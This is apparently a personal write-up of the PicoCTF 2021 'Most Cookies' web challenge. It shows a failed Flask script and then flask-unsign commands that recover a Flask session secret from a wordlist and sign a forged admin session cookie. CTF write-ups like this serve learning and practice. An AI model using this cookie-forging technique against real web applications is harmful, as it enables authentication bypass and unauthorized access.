flask session secret finding 
[flask-unsign]([flask-unsign · PyPI](https://pypi.org/project/flask-unsign/))
[write-up]([PicoCTF2021-Writeup/MostCookies.md at main · vivian-dai/PicoCTF2021-Writeup (github.com)](https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Most%20Cookies/MostCookies.md))

## Failed attempt

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import sys
app = Flask(__name__)
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
number = 1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1
app.secret_key = cookie_names[number]
url = "http://mercury.picoctf.net:18835/display"
@app.route("/")
def home():
    # for _ in cookie_names:
        # app.config['SECRET_KEY'] = _
    session["very_auth"] = "admin"
    print(request.cookies.get('session'))
    with open("./cookies.txt") as tst_:
        data = tst_.read()
    with open("./cookies.txt", "w") as tst:
        tst.write(data + request.cookies.get('session')+"\n")
    return "done!!"
@app.route("/check")
def check():
    return session['very_auth']
app.run(port=3000, debug=True)
```

## Successfull attempt

```bash
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y9Z1cQ.f-uq0wdZOFJBOQYODSL4Hpji3Zc" -w wordlist.txt  
```
for finding secret

```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
```

To encode the cookie

![[Pasted image 20230129192058.png]]
